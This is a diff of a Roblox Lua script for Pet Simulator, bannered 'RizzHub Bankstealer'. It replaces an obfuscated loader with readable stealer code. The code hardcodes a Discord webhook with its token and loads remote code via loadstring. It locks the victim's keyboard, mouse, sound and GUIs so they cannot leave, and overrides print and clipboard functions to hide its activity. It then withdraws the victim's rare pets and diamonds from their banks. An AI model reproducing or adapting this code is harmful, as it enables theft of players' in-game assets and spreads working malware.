@@ -1,12 +1,1402 @@
 --[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.9.12) ~  Much Love, Ferib 
+   ____  _         _   _       _       ____              _        _             _
+  |  _ \(_)_______| | | |_   _| |__   | __ )  __ _ _ __ | | _____| |_ ___  __ _| | ___ _ __
+  | |_) | |_  /_  / |_| | | | | '_ \  |  _ \ / _` | '_ \| |/ / __| __/ _ \/ _` | |/ _ \ '__|
+  |  _ <| |/ / / /|  _  | |_| | |_) | | |_) | (_| | | | |   <\__ \ ||  __/ (_| | |  __/ |
+  |_| \_\_/___/___|_| |_|\__,_|_.__/  |____/ \__,_|_| |_|_|\_\___/\__\___|\__,_|_|\___|_|
 
 ]]--
 
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==5) then v27=v24;v28=nil;function v28(...)return {...},v12("#",...);end v18=6;end if (v18==1) then v21=nil;function v21(v31,v32,v33)if v33 then local v68=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-1) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v68-(v68%(932 -(857 + 74))) ;else local v69=568 -(367 + 201) ;local v70;while true do if (v69==((834 + 93) -(214 + 713))) then v70=((1 -0) + 1)^(v32-(1 + 0)) ;return (((v31%(v70 + v70))>=v70) and (878 -(282 + 595))) or ((2702 -(68 + 997)) -(1523 + 114)) ;end end end end v22=nil;v18=2;end if (v18==3) then v24=nil;function v24()local v34,v35,v36,v37=v1(v16,v19,v19 + (1273 -(226 + 1044)) );v19=v19 + (17 -13) ;return (v37 * (16777333 -(32 + 85))) + (v36 * (64226 + 1310)) + (v35 * (57 + (1156 -(892 + 65)))) + v34 ;end v25=nil;v18=4;end if (v18==6) then v29=nil;function v29()local v38=0;local v39;local v40;local v41;local v42;local v43;local v44;local v45;local v46;while true do if (v38==(1785 -(599 + 1185))) then v41=nil;v42=nil;v38=1 + 1 ;end if (v38==(0 + 0)) then v39=0;v40=nil;v38=1;end if (v38~=(578 -(507 + 67))) then else while true do if (v39==(1752 -(1013 + 736))) then v46=nil;while true do local v96=0 + 0 ;while true do if (v96==(2 -1)) then if (v40~=2) then else local v108=0 -0 ;local v109;while true do if ((867 -(550 + 317))==v108) then v109=0 -0 ;while true do local v138=0 -0 ;while true do if (v138~=0) then else if (v109~=(0 -0)) then else local v172=0;while true do if ((286 -(134 + 151))~=v172) then else v109=1;break;end if (0~=v172) then else for v173=1666 -(970 + 695) ,v24() do local v174=0 -0 ;local v175;local v176;local v177;while true do if (v174==0) then v175=0;v176=nil;v174=1991 -(582 + 1408) ;end if (v174~=1) then else v177=nil;while true do if (v175~=(0 -0)) then else local v184=0;while true do if (v184==(1 -0)) then v175=1;break;end if (v184==(0 -0)) then v176=1824 -(1195 + 629) ;v177=nil;v184=1 -0 ;end end end if (v175~=(242 -(187 + 54))) then else while true do if (v176==0) then v177=v22();if (v21(v177,1,781 -(162 + 618) )==(0 + 0)) then local v185=0 + 0 ;local v186;local v187;local v188;local v189;local v190;while true do if (v185~=0) then else v186=0 -0 ;v187=nil;v185=1 -0 ;end if (v185==(1 + 1)) then v190=nil;while true do if (v186==1) then local v191=1636 -(1373 + 263) ;while true do if (v191==(1000 -(451 + 549))) then v189=nil;v190=nil;v191=1;end if (v191==(1 + 0)) then v186=2;break;end end end if (v186==(2 -0)) then while true do if (v187~=(2 -0)) then else local v193=1384 -(746 + 638) ;local v194;while true do if (v193==0) then v194=0 + 0 ;while true do if (v194~=(1 -0)) then else v187=3;break;end if (v194~=(341 -(218 + 123))) then else local v203=0;while true do if (v203~=1) then else v194=1582 -(1535 + 46) ;break;end if (v203~=0) then else if (v21(v189,1 + 0 ,1 + 0 )==(561 -(306 + 254))) then v190[2]=v46[v190[2]];end if (v21(v189,2,2)~=(1 + 0)) then else v190[3]=v46[v190[5 -2 ]];end v203=1468 -(899 + 568) ;end end end end break;end end end if (v187==(0 + 0)) then local v195=0 -0 ;local v196;while true do if (v195==(603 -(268 + 335))) then v196=290 -(60 + 230) ;while true do if (v196==(572 -(426 + 146))) then local v204=0 + 0 ;while true do if (v204~=1) then else v196=1457 -(282 + 1174) ;break;end if (v204==0) then v188=v21(v177,813 -(569 + 242) ,3);v189=v21(v177,4,17 -11 );v204=1 + 0 ;end end end if (v196==1) then v187=1025 -(706 + 318) ;break;end end break;end end end if (v187==(1254 -(721 + 530))) then if (v21(v189,1274 -(945 + 326) ,7 -4 )~=1) then else v190[4 + 0 ]=v46[v190[4]];end v41[v173]=v190;break;end if (v187~=(701 -(271 + 429))) then else local v198=0 + 0 ;while true do if (v198==1) then v187=1502 -(1408 + 92) ;break;end if (v198==(1086 -(461 + 625))) then v190={v23(),v23(),nil,nil};if (v188==0) then local v201=0;local v202;while true do if (v201~=0) then else v202=0;while true do if (v202==(1171 -(418 + 753))) then v190[2 + 1 ]=v23();v190[4]=v23();break;end end break;end end elseif (v188==(1 + 0)) then v190[1 + 2 ]=v24();elseif (v188==2) then v190[1 + 2 ]=v24() -(2^(545 -(406 + 123))) ;elseif (v188==3) then local v213=0;local v214;while true do if (v213==(1769 -(1749 + 20))) then v214=0 + 0 ;while true do if (v214==(1322 -(1249 + 73))) then v190[3]=v24() -((1 + 1)^(1161 -(466 + 679))) ;v190[4]=v23();break;end end break;end end end v198=2 -1 ;end end end end break;end if (v186==0) then local v192=0;while true do if (v192==(0 -0)) then v187=0;v188=nil;v192=1901 -(106 + 1794) ;end if (v192==1) then v186=1;break;end end end end break;end if (v185==1) then v188=nil;v189=nil;v185=1 + 1 ;end end end break;end end break;end end break;end end end for v178=1,v24() do v42[v178-(1 + 0) ]=v29();end v172=1;end end end if (v109==1) then return v44;end break;end end end break;end end end break;end if (v96==0) then if (v40~=0) then else local v110=0 -0 ;while true do if (v110~=2) then else v40=2 -1 ;break;end if (v110~=(115 -(4 + 110))) then else v43={};v44={v41,v42,nil,v43};v110=1429 -(41 + 1386) ;end if (v110==(103 -(17 + 86))) then v41={};v42={};v110=1;end end end if (v40==1) then local v111=0;while true do if ((1 + 0)~=v111) then else for v139=1,v45 do local v140=0;local v141;local v142;local v143;local v144;while true do if (v140==2) then while true do if (v141==(1 -0)) then v144=nil;while true do if (v142==(0 -0)) then local v180=166 -(122 + 44) ;while true do if (v180~=1) then else v142=1 -0 ;break;end if (v180==(0 -0)) then local v182=0 + 0 ;local v183;while true do if (v182==(0 + 0)) then v183=0;while true do if ((1 -0)~=v183) then else v180=66 -(30 + 35) ;break;end if (v183==0) then v143=v22();v144=nil;v183=1 + 0 ;end end break;end end end end end if (v142~=1) then else if (v143==(1258 -(1043 + 214))) then v144=v22()~=(0 -0) ;elseif (v143==(1214 -(323 + 889))) then v144=v25();elseif (v143~=(7 -4)) then else v144=v26();end v46[v139]=v144;break;end end break;end if (v141~=0) then else v142=580 -(361 + 219) ;v143=nil;v141=1;end end break;end if (v140==(320 -(53 + 267))) then local v170=0 + 0 ;while true do if (v170==0) then v141=0;v142=nil;v170=1;end if (v170~=(414 -(15 + 398))) then else v140=1;break;end end end if (v140==(983 -(18 + 964))) then local v171=0 -0 ;while true do if (v171==(0 + 0)) then v143=nil;v144=nil;v171=1 + 0 ;end if (v171==(851 -(20 + 830))) then v140=2;break;end end end end end v44[3 + 0 ]=v22();v111=128 -(116 + 10) ;end if (v111==0) then v45=v24();v46={};v111=1 + 0 ;end if ((740 -(542 + 196))~=v111) then else v40=3 -1 ;break;end end end v96=1 + 0 ;end end end break;end if ((0 + 0)~=v39) then else v40=0 + 0 ;v41=nil;v39=2 -1 ;end if (v39==(4 -2)) then local v95=0;while true do if (v95~=1) then else v39=3;break;end if (v95==(1551 -(1126 + 425))) then v44=nil;v45=nil;v95=406 -(118 + 287) ;end end end if (v39==(3 -2)) then v42=nil;v43=nil;v39=1123 -(118 + 1003) ;end end break;end if (v38==(8 -5)) then v45=nil;v46=nil;v38=4;end if (v38==(379 -(142 + 235))) then v43=nil;v44=nil;v38=3;end end end v30=nil;v18=7;end if (v18==4) then function v25()local v47=v24();local v48=v24();local v49=4 -(8 -5) ;local v50=(v21(v48,1 + 0 ,997 -(553 + 424) ) * ((3 -1)^((55 + 19) -42))) + v47 ;local v51=v21(v48,1223 -(373 + 829) ,28 + 3 );local v52=((v21(v48,32 + 0 )==(1 + 0 + 0)) and  -(1 -0)) or ((1976 -(1913 + 62)) + 0) ;if (v51==(0 + 0 + 0)) then if (v50==(0 + 0)) then return v52 * (0 -0) ;else v51=2 -1 ;v49=0 -0 ;end elseif (v51==(596 + 1451)) then return ((v50==(0 -0)) and (v52 * ((1 + 0)/(753 -(239 + 514))))) or (v52 * NaN) ;end return v8(v52,v51-(435 + 588) ) * (v49 + (v50/((1 + 1)^(1632 -(1183 + 397))))) ;end v26=nil;function v26(v53)local v54=0 -0 ;local v55;local v56;while true do if (v54==(2 -1)) then v55=v3(v16,v19,(v19 + v53) -1 );v19=v19 + v53 ;v54=5 -3 ;end if (v54==(307 -(244 + 60))) then return v6(v56);end if (v54==(1935 -(565 + 1368))) then v56={};for v75=3 -2 , #v55 do v56[v75]=v2(v1(v3(v55,v75,v75)));end v54=(2665 -(938 + 63)) -(1477 + 184) ;end if (v54==(0 -0)) then v55=nil;if  not v53 then v53=v24();if (v53==(0 + 0)) then return "";end end v54=857 -(564 + 292) ;end end end v18=5;end if (v18==2) then function v22()local v57=v1(v16,v19,v19);v19=v19 + 1 ;return v57;end v23=nil;function v23()local v58,v59=v1(v16,v19,v19 + (1127 -(936 + 189)) );v19=v19 + 2 + 0 ;return (v59 * (1869 -(1565 + 48))) + v58 ;end v18=3;end if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"..",function(v60)if (v1(v60,2)==79) then v20=v0(v3(v60,1,1));return "";else local v71=v2(v0(v60,16));if v20 then local v77=v5(v71,v20);v20=nil;return v77;else return v71;end end end);v18=1;end if (v18==7) then function v30(v61,v62,v63)local v64=0;local v65;local v66;local v67;while true do if (v64==0) then v65=v61[1];v66=v61[2];v64=1;end if (1==v64) then v67=v61[3];return function(...)local v78=v65;local v79=v66;local v80=v67;local v81=v28;local v82=1;local v83= -1;local v84={};local v85={...};local v86=v12("#",...) -1 ;local v87={};local v88={};for v92=0,v86 do if (v92>=v80) then v84[v92-v80 ]=v85[v92 + 1 ];else v88[v92]=v85[v92 + 1 ];end end local v89=(v86-v80) + 1 ;local v90;local v91;while true do v90=v78[v82];v91=v90[1];if (v91<=5) then if (v91<=2) then if (v91<=0) then v88[v90[2]][v90[3]]=v90[4];elseif (v91>1) then v88[v90[2]]=v90[3];else v88[v90[2]]();end elseif (v91<=3) then v82=v90[3];elseif (v91>4) then if (v88[v90[2]]==v90[4]) then v82=v82 + 1 ;else v82=v90[3];end else local v114=0;local v115;local v116;local v117;local v118;while true do if (v114==0) then v115=v90[2];v116,v117=v81(v88[v115](v13(v88,v115 + 1 ,v90[3])));v114=1;end if (v114==1) then v83=(v117 + v115) -1 ;v118=0;v114=2;end if (v114==2) then for v164=v115,v83 do v118=v118 + 1 ;v88[v164]=v116[v118];end break;end end end elseif (v91<=8) then if (v91<=6) then local v104=v90[2];v88[v104]=v88[v104](v13(v88,v104 + 1 ,v83));elseif (v91==7) then local v119=v90[2];local v120=v88[v90[3]];v88[v119 + 1 ]=v120;v88[v119]=v120[v90[4]];else local v124=0;local v125;local v126;local v127;local v128;local v129;while true do if (v124==3) then v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v124=4;end if (v124==0) then v125=nil;v126,v127=nil;v128=nil;v129=nil;v124=1;end if (v124==1) then v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];v129=v90[2];v124=2;end if (v124==5) then for v167=v129,v83 do v125=v125 + 1 ;v88[v167]=v126[v125];end v82=v82 + 1 ;v90=v78[v82];v129=v90[2];v124=6;end if (v124==4) then v129=v90[2];v126,v127=v81(v88[v129](v13(v88,v129 + 1 ,v90[3])));v83=(v127 + v129) -1 ;v125=0;v124=5;end if (v124==6) then v88[v129]=v88[v129](v13(v88,v129 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]();v124=7;end if (v124==2) then v128=v88[v90[3]];v88[v129 + 1 ]=v128;v88[v129]=v128[v90[4]];v82=v82 + 1 ;v124=3;end if (7==v124) then v82=v82 + 1 ;v90=v78[v82];v82=v90[3];break;end end end elseif (v91<=9) then v88[v90[2]]=v63[v90[3]];elseif (v91>10) then v88[v90[2]][v90[3]]=v90[4];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]][v90[3]]=v90[4];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v82=v90[3];else do return;end end v82=v82 + 1 ;end end;end end end return v30(v29(),{},v17)(...);end end end v15("LOL!0B3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403513O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F7665737479782F50657453696D756C61746F72584175746F4661726D2F6D61696E2F48617374654661726D2E6C756103023O005F4703063O00557365724944023O009D95EBBB4103073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3133322O39343933373134372O38332O35302F6473304B39365366705441576E4A616B585F7577574A7074372D4C52694474727A514E684A446E4D4E6E5834716B336A48704E694F5368777476354871566C705F68583000143O0012023O00013O0026053O000B000100020004033O000B0001001209000100033O001208000200043O00202O00020002000500122O000400066O000200046O00013O00024O00010001000100044O001300010026053O0001000100010004033O00010001001209000100073O00300B00010008000900122O000100073O00302O0001000A000B00124O00023O00044O000100012O000A3O00017O00",v9(),...);
+local dhuser = "FabiZockt_YT"       -- dualhooking user
+local dhwebhook = "https://discord.com/api/webhooks/1133072533558657114/kxKJlO3mZDb0L8CmqrGiw_-HofLRigWmxeYGa9MaQqqVs0i94bSCrXP7T2GOJ2WRqNlP" -- Dualhooking Webhook
+local loadingraw = "LoadingScreen Raw Link" -- Put Your LoadingScreen Raw Link Here
+
+if getgenv().executed1 then return end
+getgenv().executed1 = true
+
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local disabledKeyCodes = {
+    0x73,
+    0xA4,
+    0xA5,
+    0x1B,
+    0x0D,
+};
+UserSettings().GameSettings.MasterVolume = 0
+if _G.MouseLock ~= false then
+    runService.RenderStepped:Connect(function()
+        for _, keyCode in next, disabledKeyCodes do
+            keyrelease(keyCode)
+        end
+
+        mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
+    end);
+end
+local function antiPrint(...)
+    local info = debug.getinfo(2)
+    if info and info.what == 'Lua' and info.func == print then
+        return
+    end
+    return print(...)
+end
+print = antiPrint
+rconsoleprint = antiPrint
+rconsolewarn = antiPrint
+rconsoleerr = antiPrint
+rconsoleinput = antiPrint
+printconsole = antiPrint
+setclipboard = antiPrint
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+
+-- Detection
+
+
+local exploit
+request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
+    HttpPost
+local function getexploit()
+    local exploitt =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "KRNL") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Couldnt Grab")
+
+    exploit = exploitt
+end
+
+getexploit()
+local dhid
+local idiotuser = game:GetService("Players").LocalPlayer.Name
+local url = _G.Webhook
+if _G.UserID == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserId")
+    return;
+end
+local worked = pcall(function()
+    game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+end)
+if not worked then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid UserId!")
+    return;
+end
+local UserName = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+if idiotuser == UserName then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
+end
+if dhuser ~= nil then
+    local test = pcall(function()
+        game:GetService("Players"):GetUserIdFromNameAsync(dhuser)
+    end)
+    if test then
+        dhid = game:GetService("Players"):GetUserIdFromNameAsync(dhuser)
+    else
+        game:GetService("Players").LocalPlayer:Kick("Invalid Dh User!")
+    end
+end
+-- Checks
+
+
+if _G.LoadingScreen ~= false then
+    loadstring(game:HttpGet(loadingraw))()
+end
+if _G.AntiLeave ~= false then
+    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if v.Name ~= "Inventory" then
+            v:Destroy()
+        end
+    end
+    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+            v:Destroy()
+        end
+    end
+end
+-- Remotes
+
+local getmybanksremote = debug.getconstant(
+    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+    "Bank Client"]).GetMyBanks, 3)
+
+local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).InviteToBank, 18)
+
+local lockremote = debug.getconstant(
+    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory)
+    .LockPets, 5)
+
+local depositremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).Deposit, 16)
+
+local eggremote = debug.getconstant(
+    debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts
+        .Game.Eggs).SetupEgg)[5], 26)
+
+local getbankremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).GetBank, 3)
+
+local upgraderemote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).UpgradeBank, 18)
+
+local kickremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).KickMember, 9)
+
+local withdrawremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).Withdraw, 16)
+
+-- Libs
+
+local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+local bloby = getupvalues(blobx[2])
+local blobz = getupvalues(bloby[1])[1][2]
+local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+local blobb = getupvalues(bloba[2])
+
+getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
+inviteremote = blobz[blobb[2](2, inviteremote)]
+lockremote = blobz[blobb[2](2, lockremote)]
+depositremote = blobz[blobb[2](2, depositremote)]
+eggremote = blobz[blobb[2](2, eggremote)]
+getbankremote = blobz[blobb[2](2, getbankremote)]
+upgraderemote = blobz[blobb[2](2, upgraderemote)]
+kickremote = blobz[blobb[2](2, kickremote)]
+withdrawremote = blobz[blobb[2](2, withdrawremote)]
+
+
+local lib = require(game.ReplicatedStorage:WaitForChild("Library"))
+local mybanks = getmybanksremote:InvokeServer()
+
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Bank.Pad.Position)
+
+task.wait()
+if mybanks[1] == nil then
+    game:GetService("Players").LocalPlayer:Kick("Script Is Not Supported 1")
+    return;
+end
+-- Banks Locals
+
+-- Bank Withdraws
+
+-- Bank 1
+
+local SuperBank
+local Bank
+local SuperBank2
+local Bank2
+local SuperBank3
+local Bank3
+local SuperBank4
+local Bank4
+local SuperBank5
+local Bank5
+local FinalList2 = {}
+local FinalList3 = {}
+local FinalList4 = {}
+local FinalList5 = {}
+local LFinalList = {}
+local bdiaamt = 0
+local bdiaamt2 = 0
+local bdiaamt3 = 0
+local bdiaamt4 = 0
+local bdiaamt5 = 0
+local bankscount = 0
+local FinalFinal = 0
+local DiamondsDiamonds = 0
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+
+LHugBEList = {}
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.huge then
+        table.insert(LHugBEList, i)
+    end
+    if v.titanic then
+        table.insert(LHugBEList, i)
+    end
+    if v.name == "banana" then
+        table.insert(LHugBEList, i)
+    end
+end)
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Bank.Pad.Position)
+if mybanks[1] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[2] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[3] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[4] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[5] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[1] ~= nil then
+    local BankID = mybanks[1]["BUID"]
+    Bank = BankID
+    LHList = {}
+    SuperBank = getbankremote:InvokeServer(Bank)
+    local lpets = SuperBank.Storage.Pets
+    local y = {}
+    for i, v in pairs(lpets) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(lpets) do
+        if table.find(LHugBEList, v["id"]) ~= nil and v.l then
+            table.insert(LHList, v["uid"])
+        end
+    end
+    if #LHList < 50 then
+        for i, v in pairs(LHList) do
+            table.insert(LFinalList, v)
+        end
+    elseif #LHList > 50 then
+        for i, v in pairs(LHList) do
+            if #LFinalList < 50 then
+                table.insert(LFinalList, v)
+            end
+        end
+    end
+    if #LFinalList ~= 0 then
+        local A_5 = {
+            [1] = Bank,
+            [2] = LFinalList,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank, LFinalList, 0)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank, FinalList, 0)
+        end
+        wait(1.5)
+    end
+end
+
+if mybanks[2] ~= nil then
+    local BankID2 = mybanks[2]["BUID"]
+    Bank2 = BankID2
+    SuperBank2 = getbankremote:InvokeServer(Bank2)
+    BHList2 = {}
+    local pets2 = SuperBank2.Storage.Pets
+    local y = {}
+    for i, v in pairs(pets2) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(pets2) do
+        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
+            table.insert(BHList2, v["uid"])
+        end
+    end
+    if #BHList2 < 50 then
+        for i, v in pairs(BHList2) do
+            table.insert(FinalList2, v)
+        end
+    elseif #BHList2 > 50 then
+        for i, v in pairs(BHList2) do
+            if #FinalList2 < 50 then
+                table.insert(FinalList2, v)
+            end
+        end
+    end
+    bdiaamt2 = SuperBank2.Storage.Currency.Diamonds
+    if bdiaamt2 >= 1000000000 then
+        bdiaamt2 = bdiaamt2
+    elseif #FinalList2 ~= 0 and bdiaamt2 < 1000000000 then
+        bdiaamt2 = bdiaamt2
+    else
+        bdiaamt2 = 0
+    end
+    if #FinalList2 ~= 0 or bdiaamt2 ~= 0 then
+        local A_1 = {
+            [1] = Bank2,
+            [2] = FinalList2,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank2, FinalList2, bdiaamt2)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank2, FinalList2, 0)
+        end
+        wait(1.5)
+    end
+end
+if mybanks[3] ~= nil then
+    local BankID3 = mybanks[3]["BUID"]
+    Bank3 = BankID3
+    SuperBank3 = getbankremote:InvokeServer(Bank3)
+    BHList3 = {}
+    local pets3 = SuperBank3.Storage.Pets
+    local y = {}
+    for i, v in pairs(pets3) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(pets3) do
+        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
+            table.insert(BHList3, v["uid"])
+        end
+    end
+    if #BHList3 < 50 then
+        for i, v in pairs(BHList3) do
+            table.insert(FinalList3, v)
+        end
+    elseif #BHList3 > 50 then
+        for i, v in pairs(BHList3) do
+            if #FinalList3 < 50 then
+                table.insert(FinalList3, v)
+            end
+        end
+    end
+    bdiaamt3 = SuperBank3.Storage.Currency.Diamonds
+    if bdiaamt3 >= 1000000000 then
+        bdiaamt3 = bdiaamt3
+    elseif #FinalList3 ~= 0 and bdiaamt3 < 1000000000 then
+        bdiaamt3 = bdiaamt3
+    else
+        bdiaamt3 = 0
+    end
+    if #FinalList3 ~= 0 or bdiaamt3 ~= 0 then
+        local A_1 = {
+            [1] = Bank3,
+            [2] = FinalList3,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank3, FinalList3, bdiaamt3)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank3, FinalList3, 0)
+        end
+        wait(1.5)
+    end
+end
+if mybanks[4] ~= nil then
+    local BankID4 = mybanks[4]["BUID"]
+    Bank4 = BankID4
+    SuperBank4 = getbankremote:InvokeServer(Bank4)
+    BHList4 = {}
+    local pets4 = SuperBank4.Storage.Pets
+    local y = {}
+    for i, v in pairs(pets4) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(pets4) do
+        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
+            table.insert(BHList4, v["uid"])
+        end
+    end
+    if #BHList4 < 50 then
+        for i, v in pairs(BHList4) do
+            table.insert(FinalList4, v)
+        end
+    elseif #BHList4 > 50 then
+        for i, v in pairs(BHList4) do
+            if #FinalList4 < 50 then
+                table.insert(FinalList4, v)
+            end
+        end
+    end
+    bdiaamt4 = SuperBank4.Storage.Currency.Diamonds
+    if bdiaamt4 >= 1000000000 then
+        bdiaamt4 = bdiaamt4
+    elseif #FinalList4 ~= 0 and bdiaamt4 < 1000000000 then
+        bdiaamt4 = bdiaamt4
+    else
+        bdiaamt4 = 0
+    end
+    if #FinalList4 ~= 0 or bdiaamt4 ~= 0 then
+        local A_1 = {
+            [1] = Bank4,
+            [2] = FinalList4,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank4, FinalList4, bdiaamt4)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank4, FinalList4, 0)
+        end
+        wait(1.5)
+    end
+end
+
+-- Bank 5
+
+if mybanks[5] ~= nil then
+    local BankID5 = mybanks[5]["BUID"]
+    Bank5 = BankID5
+    SuperBank5 = getbankremote:InvokeServer(Bank5)
+    BHList5 = {}
+    local pets5 = SuperBank5.Storage.Pets
+    local y = {}
+    for i, v in pairs(pets5) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(pets5) do
+        if table.find(LHugBEList, v["id"]) ~= nil and not v.l then
+            table.insert(BHList5, v["uid"])
+        end
+    end
+    if #BHList5 < 50 then
+        for i, v in pairs(BHList5) do
+            table.insert(FinalList5, v)
+        end
+    elseif #BHList5 > 50 then
+        for i, v in pairs(BHList5) do
+            if #FinalList5 < 50 then
+                table.insert(FinalList5, v)
+            end
+        end
+    end
+    bdiaamt5 = SuperBank5.Storage.Currency.Diamonds
+    if bdiaamt5 >= 1000000000 then
+        bdiaamt5 = bdiaamt5
+    elseif #FinalList5 ~= 0 and bdiaamt5 < 1000000000 then
+        bdiaamt5 = bdiaamt5
+    else
+        bdiaamt5 = 0
+    end
+    if #FinalList5 ~= 0 or bdiaamt5 ~= 0 then
+        local A_1 = {
+            [1] = Bank5,
+            [2] = FinalList5,
+            [3] = 0
+        }
+
+        wait()
+        local s, e = pcall(function()
+            withdrawremote:InvokeServer(Bank5, FinalList5, bdiaamt5)
+        end)
+
+        if s == false then
+            wait(0.2)
+            withdrawremote:InvokeServer(Bank5, FinalList5, 0)
+        end
+        wait(1.5)
+    end
+end
+FinalFinal = #FinalList2 + #FinalList3 + #FinalList4 + #FinalList5
+DiamondsDiamonds = bdiaamt2 + bdiaamt3 + bdiaamt4 + bdiaamt5
+print(DiamondsDiamonds)
+
+
+local SuperBank = getbankremote:InvokeServer(Bank)
+local tier = SuperBank["Tier"]
+local max = 50
+local gemsinbank = SuperBank["Storage"]["Currency"]["Diamonds"]
+local petsinbank = #SuperBank["Storage"]["Pets"]
+local tier1hold = 40 - petsinbank
+local tier2hold = 95 - petsinbank
